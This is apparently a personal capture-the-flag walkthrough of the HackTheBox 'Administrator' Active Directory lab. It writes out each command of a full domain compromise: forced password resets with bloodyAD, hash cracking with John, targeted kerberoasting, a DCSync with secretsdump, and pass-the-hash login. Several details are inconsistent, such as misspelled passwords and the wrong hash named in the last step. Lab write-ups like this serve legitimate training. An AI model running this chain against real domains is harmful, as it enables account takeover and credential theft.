
# Nmap Scan

![[Pasted image 20250518205830.png]]

- Domain: administrator.htb0
- realized there is FTP

# Edit etc/host

```
10.129.198.235 DC DC.administrator.htb administrator.htb
```

# Smb, winrm scans

Check FTP
>nxc ftp administrator.htb -u Olivia -p ichliebedich

- in NMAP scan we saw **FTP** being there, so ODD an ADMIN like OLIVIA cant get access to FTP, something to look out for!

Check winrm

>nxc winrm administrator.htb -u Olivia -p ichliebedich

Check SMB

> nxc smb administrator.htb -u "olivia" -p "ichliebedich"

- will provide us list of users
![[Pasted image 20250518210836.png|SMB user list]]
# Bloodhound

> bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.129.198.235

- can run bloodhound python FROM OUR MACHINE
- return us bunch of **json**, to be ingested in bloodhound

#### look for outbound object for OLIVIA in bloodhound

##### check OLIVIA node info

![[Pasted image 20250518211336.png|Olivia has genericAll for Michael]]

- oblivia@administrator.htb has ***GenericAll*** for Michael@administrator.htb

 > google how to ABUSE GenericAll

##### check MICHAEL node info

![[Pasted image 20250518211526.png|Michael has ForceChangePassword for Benjamin]]
- michael has ***ForceChangePassword*** for benjamin@administrator.htb

# Going from OLIVIA -> MICHAEL

## BloodyAD: Update Password for Michael

> bloodyAD -u 'olivia' -p 'ichliebedich' -d 'administrator.htb' --host '10.129.198.235' set password 'Michael' 'Password123'

![[Pasted image 20250518212004.png|Password changed successfully for Michael|600]]
![[Pasted image 20250518212107.png|Michael PAWNED|600]]
## BloodyAD: Update Password for Benjamin using Michael

> bloodyAD -u 'Michael' -p 'Password123' -d 'administrator.htb' --host '10.129.198.235' set password 'Benjamin' 'Password123'


# Revisit FTP with New Creds, Benjamin

>nxc ftp administrator.htb -u Benjamin -p Password123

**Enter FTP**

> ftp administrator.htb
> Benjamin
> (enter password)

![[Pasted image 20250518214117.png|FTP accessed by Benjamin]]
**Get the Backup file**

> get Backup.psafe3

Backup file is **Password protected**

# Pwsafe2John: Crack the Backup.psafe3

> pwsafe2john Backup.psafe3

![[Pasted image 20250518215738.png|Hash from pwsafe2john]]
save the hash in text file, ***hash.txt***
![[Pasted image 20250518215815.png|Hash saved in hash.txt]]
# John the Ripper to Crack Hash

> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

password got: tekieromucho

## Install passwordsafe to read pwsafe file

> sudo dpkg -i passwordsafe-debian12-1.21-amd64.deb

open the backupfile using passwordsafe

> pwsafe Backup.psafe3

- enter the password, tekieromucho

![[Pasted image 20250518220315.png|Multiple username and passwords in Password Safe]]
- save the username, password to your note

# Get in evil-winrm with the new names/creds

> evil-winrm -i administrator.htb -u emily -p <emilys_password>

#### First Flag

***First Flag*** in C:\Users\emily\Desktop\user.txt

# BloodHound: Emily's Node info

#### Outbound Object for Emily: Ethan@Administrator.Htb
- Emily has GenericWrite over Ethan
- since Emily has GenericWrite on Ethan, we can do **targeted kerberoasting attack**

### Download targetedKerberoast.py

> python targetedKerberoast.py -u 'emily' -p <emilys_password> -d 'administrator.htb' --dc-ip:10.129.198.235

### Ran into TIME ISSUE

![[Pasted image 20250519011210.png|Time Issue when Running targetedKerberoast.py]]
#### Update NT

> sudo ntpdate administrator.htb

rerun targetedKerberoast.py

we get **hash for ETHAN**
- save it to `ethan.txt`

### JohnTheRipper: crack password for ethan.txt

> john --wordlist=/usr/share/wordlists/rockyou.txt ethan.txt

- got the password: **limpbizkit**

Got **ACCESS to ETHAN**

### OUTBOUND for ETHAN in BloodHound: First Degree Obj Control

- we have ***DCSYNC*** to Administrator.htb
- also have ***GetChanges & GetChangesAll*** for DCSync Attack

#### use SECRETS DUMP from impacket

> impacket-secretsdump "Administrator.htb/ethan:limpkizkit"@"dc.Administrator.htb"

got the ***ADMINISTRATOR HASH***

![[Pasted image 20250519012111.png|NTLM Hash for Administrator]]
#### use Evil-WinRM to login as ADMIN

> evil-winrm -i administrator.htb -u administrator -H <NTLM_hash_for_ethan>

- **Second flag** in C:\Users\Administrator\Desktop\root.txt

